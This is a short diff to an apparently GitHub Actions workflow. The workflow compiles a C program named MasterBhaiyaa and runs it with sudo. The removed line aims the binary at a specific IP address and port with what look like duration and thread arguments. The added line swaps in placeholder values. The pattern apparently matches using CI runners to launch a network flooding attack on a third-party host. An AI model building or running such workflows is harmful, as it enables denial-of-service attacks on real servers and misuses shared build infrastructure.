@@ -20,4 +20,4 @@ jobs:
 
       - run: gcc master1.c -o MasterBhaiyaa -lpthread -O3
 
-      - run: sudo ./MasterBhaiyaa 96.0.69.7 15026 120 900
+      - run: sudo ./MasterBhaiyaa 1 1 1 900
